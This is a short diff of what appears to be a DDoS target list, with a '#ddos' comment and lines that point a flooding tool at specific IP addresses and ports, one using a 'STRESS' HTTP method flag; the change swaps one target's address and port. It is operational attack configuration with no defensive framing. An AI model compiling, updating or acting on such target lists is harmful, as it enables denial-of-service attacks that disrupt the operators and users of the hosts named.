@@ -51,7 +51,7 @@ ns3.cse.ru tcp://185.65.21.153:22 tcp://185.65.21.153:53 tcp://185.65.21.153:200
 
 #ddos separiv
 
-https://195.50.4.54 tcp://195.50.4.54:443 --http-methods STRESS
+https://195.50.7.181 tcp://195.50.7.181:21 --http-methods STRESS
 
  
 
